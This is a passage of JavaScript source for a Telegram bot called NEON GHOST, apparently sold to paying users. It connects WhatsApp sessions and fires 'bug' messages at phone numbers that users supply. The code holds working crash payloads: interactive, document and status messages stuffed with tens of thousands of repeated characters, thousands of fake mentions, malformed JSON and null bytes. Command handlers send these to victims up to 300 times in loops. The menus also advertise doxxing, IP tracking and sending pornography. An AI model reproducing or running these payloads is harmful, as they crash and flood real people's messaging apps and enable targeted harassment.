                        display_text: "Call Us Null",
                        id: "message"
                      })
                    },
                    {
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Copy Crash Code",
                        id: "message",
                        copy_code: "#CRASHCODE9741"
                      })
                    },
                    {
                      name: "cta_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Set Reminder Crash",
                        id: "message"})
                    },
                    {
                      name: "cta_cancel_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Cancel Reminder Crash",
                        id: "message"
                      })
                    },
                    {
                      name: "address_message",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Send Crash Address",
                        id: "message"
                      })
                    },
                    {
                      name: "send_location",
                      buttonParamsJson: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸"
                    }
                  ]
                }
              }
            ],
            messageVersion: 1
          }
        }
      }
    }
  }, {
  });

  await sock.relayMessage(target, message.message, {
    messageId: message.key.id
  });

  console.log("Send Bug To Target");
}

async function XStromXCallGalaxy(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           header: {
              title: "ê¦¾".repeat(77777),
              hasMediaAttachment: false,
            },
            body: {
              text: "ðŸ¦ </ðŸ§¬âƒŸà¼‘âŒâƒ°ð™“ð™Žð™©ð™§ð™¤ð™¢ð™ð™¡ð™¤ð™¬ð™šð™§à½€Í¡" + "áŸ„áŸ".repeat(25000),
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );
   
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug XCallGalaxy To ${target}`));
}

async function nullPacth(sock, target) { 
  let msg = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            mentionedJid: Array.from({length: 2000}, (_, i) => 
              `62${String(8000000000 + i).slice(0,11)}@s.whatsapp.net`
            ),
            groupMentions: [
              {
                groupJid: 'status@broadcast',
                groupSubject: 'ꦾ'.repeat(5000)
              }
            ],
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "ꦾ".repeat(10000),
                contextInfo: {
                  mentionedJid: ['0@s.whatsapp.net']
                }
              }
            },
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
            stanzaId: 'BAE5' + Date.now(),
            pushName: 'ꦾ'.repeat(20000),
            expiration: 604262800,
            status: 3,
            deviceSentFrom: 'android'
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  const msg2 = {
    interactiveMessage: {
      header: {
        title: "📱 MENU UTAMA",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },

      body: {
        text: "ꦾ".repeat(20000)
      },

      footer: {
        text: "ꦾ".repeat(20000)
      },

      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ONDET TWO BE ONE", description: "\u0000".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, msg2, {
    messageId: null,
    participant: { jid: target }
  });

  let msg3 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(63000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦽ".repeat(1024)
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_call", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
            ],
            messageParamsJson: "{}"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg3, {
    messageId: null,
    participant: { jid: target }
  });

  let msg4 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(20000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "ꦾ".repeat(20000),
              address: "ꦾ".repeat(20000)
            },
            hasMediaAttachment: true
          },
          body: {
            text: "ꦾ".repeat(20000)
          },
          footer: {
            text: "ꦾ".repeat(20000)
          },
          nativeFlowMessage: {
            name: "ꦾ".repeat(20000),
            messageParamsJson: "ꦾ".repeat(20000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => 
              `1${3000000000 + z}@s.whatsapp.net`
            ),
            stanzaId: "ꦾ".repeat(5000),
            participant: target,
            isForwarded: true,
            forwardingScore: 99999
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg4, {
    messageId: null,
    participant: { jid: target }
  });
}

async function BulldoEso(sock, target) {
  const msg = {
    aiRichResponseMessage: {
      text: "\x10".repeat(20000),
      codeMetadata: {
        highlightType: 99999999,
        language: "javascript",
        title: "{}"
      },
      codeSnippet: "\n".repeat(20000),

      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });

  console.log(chalk.red(`Succes send to ${target}`));
}

//𝔢𝔫𝔡 𝔣𝔲𝔫𝔠𝔱𝔦𝔬𝔫

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

// START COMMAND
// ====== OTP SYSTEM ======
const CORRECT_OTP = "1000";
const verifiedUsers = new Set();
// COMMAND /otp
bot.onText(/\/otp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const otp = match[1];

  if (otp === CORRECT_OTP) {
    verifiedUsers.add(chatId);
    return bot.sendMessage(chatId, "✅ Verifikasi OTP Berhasil!\nSilahkan ketik /start untuk membuka menu.");
  }

  bot.sendMessage(chatId, "❌ OTP salah bro, coba lagi.");
});

// ===============================================
// 🔥 GLOBAL REST MODE
// ===============================================
let isRest = false;
let restEndTime = null;

function parseDuration(input) {
  let total = 0;
  const m = input.match(/(\d+)m/);
  const s = input.match(/(\d+)s/);

  if (m) total += parseInt(m[1]) * 60000;
  if (s) total += parseInt(s[1]) * 1000;

  return total;
}

function formatTime(ms) {
  const m = Math.floor(ms / 60000);
  const s = Math.floor((ms % 60000) / 1000);
  return `${m}m ${s}s`;
}

// ===============================================
// 🔥 COMMAND /autoaktif (Menit + Detik + Mix)
// ===============================================
bot.onText(/\/autoaktif (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  const duration = parseDuration(input);

  if (!duration || duration <= 0) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nContoh:\n`/autoaktif 5m`\n`/autoaktif 30s`\n`/autoaktif 2m30s`",
      { parse_mode: "Markdown" }
    );
  }

  isRest = true;
  restEndTime = Date.now() + duration;

  bot.sendMessage(
    chatId,
    `⏳ Bot masuk mode istirahat selama *${formatTime(duration)}*\n⚡ Akan aktif kembali otomatis.`,
    { parse_mode: "Markdown" }
  );

  setTimeout(() => {
    isRest = false;
    bot.sendMessage(chatId, "⚡ Bot telah aktif kembali!");
  }, duration);
});
//COMMAND START
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  // =====================
  // ⚠️ CEK REST MODE
  // =====================
  if (isRest) {
    const sisa = restEndTime - Date.now();

    if (sisa <= 0) {
      isRest = false;
      bot.sendMessage(chatId, "⚡ Bot telah aktif kembali otomatis!");
    } else {
      return bot.sendMessage(
        chatId,
        `⚠️ Bot sedang offline.\n⏳ Aktif kembali dalam *${formatTime(sisa)}*.`,
        { parse_mode: "Markdown" }
      );
    }
  }

  // =====================
  // 🔐 CEK OTP
  // =====================
  if (!verifiedUsers.has(chatId)) {
    return bot.sendMessage(chatId, "🔐 Masukkan OTP dulu bro.\nFormat: /otp <kode>");
  }

  // =====================
  // 📌 MENU UTAMA
  // =====================
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomPhoto = getRandomPhoto();

  try {

    await bot.sendPhoto(chatId, randomPhoto, {
      caption: `<blockquote><b>
📌 Привет ${username}, я NEON GHOST, созданный @kanzzzSoloo, чтобы быть вашим помощником по ошибкам. 
──────────────────────
• Developer : @kanzzzSoloo
• Version : 1.1.0
• Status : Vip Buy Only
• BotName : Neon Ghost
• Language : JavaScript

👤 INFORMATION ANDA
──────────────────────
• Username : ${username}
• Runtime  : ${runtime}
• Premium  : ${premiumStatus}
• Sender   : ${isWhatsAppConnected ? "Connected ✅" : "❌"}

👍 감사합니다
━═━═━═━═━═━═━═━</b></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "₮Q₮Ø", callback_data: "thanksto" },
            { text: "฿Ʉ₲-₴₱Ɇ₣ł₳Ⱡ", callback_data: "crash_menu" },
            { text: "฿Ʉ₲-ĐɆⱠ₳Ɏ", callback_data: "delay_menu" }
          ],
          [
            { text: "Ø₩₦ɆⱤ-₥Ɇ₦Ʉ", callback_data: "akses" },
            { text: "₣Ʉ₦-₥Ɇ₦Ʉ", callback_data: "md" },
            { text: "ĐɆVɆⱠØ₱ɆⱤ", url: "https://t.me/kanzzzSoloo" }
          ],
          [
            { text: "₣Ʉ₦-₥Ɇ₦Ʉ 2", callback_data: "scmd" },
            { text: "ł₦₣ØⱤ₥₳₮łØ₦", url: "https://t.me/kanzzzganteng" }
          ]
        ]
      }
    });

    // Audio Welcome
    const audioPath = path.join(__dirname, "always", "arkan.mp3");
    await bot.sendAudio(chatId, fs.createReadStream(audioPath), {
      caption: "👻",
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Error pada /start");
  }
});
// CALLBACK HANDLER
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomPhoto = getRandomPhoto();

    let caption = "";
    let replyMarkup = {};

    // BUG MENU
    if (query.data === "crash_menu") {
      caption = `<blockquote><b>━━━━━━━━━━━━━━━
    BUG SPECIAL
━━━━━━━━━━━━━━━  
き /Crash 62xxx
ᴄʀᴀsʜ sᴛᴜᴄᴋ ʟᴏɢᴏ
き /blankhard 62xxx
ʙʟᴀɴᴋ ɴᴏᴛɪғ + ғᴄ ᴄʟɪᴄᴋ
き /fcnoclick 62xxx
ғᴏʀᴄʟᴏsᴇ ɴᴏ ᴄʟɪᴄᴋ ( ᴍᴀʏʙᴇ )
き /freeze 62xxx
ғʀᴇᴇᴢᴇ ɴᴏ ᴄʟɪᴄᴋ
き /blankmaklo
ʙʟᴀɴᴋ ɴᴏ ᴄʟɪᴄᴋ ( ᴍᴀʏʙᴇ )
━━━━━━━━━━━━━━━
MENU BUG BEBAS SPAM
━━━━━━━━━━━━━━━
き /fc1msg 62xxx
ғᴏʀᴄʟᴏsᴇ 𝟷 ᴍᴇssᴀɢᴇ  
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ ₥₳ł₦ ₥Ɇ₦Ʉ", callback_data: "back_to_main" }]] };
    }

    // THANKS TO
    if (query.data === "thanksto") {
      caption = `<blockquote><b>      
━━━━━━━━━━━━━━━
    𝚃𝙷𝙰𝙽𝙺'𝚂 - 𝚃𝙾
━━━━━━━━━━━━━━━
- kanzzzSoloo ( Developer )
- lannofficial ( support )
- ALL BUYER NEON GHOST
- ALL PT/OWN/RESELLER DLL NEON GHOST
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ ₥₳ł₦ ₥Ɇ₦Ʉ", callback_data: "back_to_main" }]] };
    }

    // AKSES MENU
    if (query.data === "akses") {
      caption = `<blockquote><b>      
 ━━━━━━━━━━━━━━━
      𝙰𝙺𝚂𝙴𝚂 - 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━
き /addprem - ɪᴅ - ᴀɴɢᴋᴀ - ᴅ  
き /delprem - ɪᴅ  
き /listprem  
き /setjeda - ᴀɴɢᴋᴀ - s - ᴍ  
き /addadmin - ɪᴅ  
き /deladmin - ɪᴅ  
き /addbot - 628 ×͜×
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ ₥₳ł₦ ₥Ɇ₦Ʉ", callback_data: "back_to_main" }]] };
    }

    // SCMD MENU
    if (query.data === "scmd") {
      caption = `<blockquote><b>━━━━━━━━━━━━━━━
       𝚂𝙲𝙼𝙳 - 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━
き /ig - Download Instagram  
き /brat - Buat gambar Brat  
き /pinterest - Cari Pinterest  
き /tiktok - Download TikTok  
き /tourl - Foto/Video To Link 
き /gpt - Ai Gpt
き /trackip - Ip target 
き /listharga - cek harga sc
き /cekmiskin - username
き /iqc 
き /cekpacar - username 
き /cekkhodam - username
き /cekmati - username 
き /info - user
き /ramalnasib - user
き /slot
き /cekmasadepan - user
き /dramaku
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ ₥₳ł₦ ₥Ɇ₦Ʉ", callback_data: "back_to_main" }]] };
    }

    // BACK TO MAIN
    if (query.data === "md") {
      caption = `<blockquote><b>
  ━━━━━━━━━━━━━━━
       𝚂𝙲𝙼𝙳 - 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━ 
き /ceksabar - username
き /cekcantik - username 
き /cektolol - username
き /cekkaya - username
き /cektampan - username 
き /sendbokep - Id tele
き /hd
き /ppcouple 
き /doxipcyber
き /trackipcyber
き /katakata 
き /gombalin
き /tebakmat
き /roastme - user
き /apakah
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ ₥₳ł₦ ₥Ɇ₦Ʉ", callback_data: "back_to_main" }]] };
    }

    // BACK TO MAIN
    if (query.data === "delay_menu") {
      caption = `<blockquote><b>
━━━━━━━━━━━━━━━
 MENU BUG DELAY (WORK)
━━━━━━━━━━━━━━━
き /delayinvis 62xxx
ᴅᴇʟᴀʏ ɪɴᴠɪs ᴛᴀɴᴘᴀ ᴊᴇᴊᴀᴋ
き /delayhard 62xxx
ᴅᴇʟᴀʏ ʜᴀʀᴅ ᴛᴀɢ sᴡ
き /delaybasic 62xxx
ᴅᴇʟᴀʏ ᴍᴇᴅɪᴜᴍ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴛᴇs ᴅᴏᴀɴɢ
き /bulldozer
ʙᴜʟʟᴅᴏᴢᴇʀ + ᴅᴇʟᴀʏ
━━━━━━━━━━━━━━━
オ Username : ${username}  
オ Runtime  : ${runtime}  
オ Premium  : ${premiumStatus}
オ Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
━━━━━━━━━━━━━━━</b></blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "⬅ Main Menu", callback_data: "back_to_main" }]] };
    }

    // BACK TO
    if (query.data === "back_to_main") {
      caption = `<blockquote><b>
📌 Привет, я NEON GHOST, созданный @kanzzzSoloo, чтобы быть вашим помощником по ошибкам. 
──────────────────────
• Developer : @kanzzzSoloo
• Version : 1.1.0 
• Status : Vip Buy Only
• BotName : Neon Ghost
• Language : JavaScript

👤 귀하의 정보
──────────────────────
• Username : ${username}
• Runtime  : ${runtime}
• Premium  : ${premiumStatus}
• Sender  : ${isWhatsAppConnected ? "Connected ✅" : "❌"}
👍 구매해주셔서 감사합니다
━═━═━═━═━═━═━═━</b></blockquote>`,
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "₮Q₮Ø", callback_data: "thanksto" },
            { text: "฿Ʉ₲-₴₱Ɇ₵ł₳Ⱡ", callback_data: "crash_menu" },
            { text: "฿Ʉ₲-ĐɆⱠ₳Ɏ", callback_data: "delay_menu"}
          ],
          [
            { text: "Ø₩₦ɆⱤ ₥Ɇ₦Ʉ", callback_data: "akses" },
            { text: "₣Ʉ₦ ₥Ɇ₦Ʉ", callback_data: "md" },
             { text: "ĐɆVɆⱠØ₱ɆⱤ", url: "https://t.me/kanzzzSoloo" },
             { text: "ĐɆVɆⱠØ₱ɆⱤ2", url: "https://t.me/" },
          ],
          [
            { text: "₥Ɇ₦Ʉ ₣Ʉ₦ 2", callback_data: "scmd" },
             { text: "ł₦₣ØⱤ₥₳₮łØ₦", url: "https://t.me/kanzzzganteng" } 
          ]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomPhoto,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (err) {
    console.error("Callback Error:", err);
  }
});

// PEMANGGILAN
bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@newsletter`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawah
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://t.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Coldown ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 300; i++) {
    await ghotsinvisible(sock, target);
    await sleep(4000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Coldown ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://t.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 300; i++) {
    await delayAnukm(sock, target);
    await sleep(3000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delaybasic (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

   if (cooldown > 0) {
  return bot.sendMessage(chatId, `Coldown ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
 `Coldown ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 79; i++) {
    await slomobanget(sock, target);
    await sleep(3000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Dikirim༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//DELAY BUG
bot.onText(/\/fcclick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Coldown ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "https://T.me/${config.USERNAME}" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
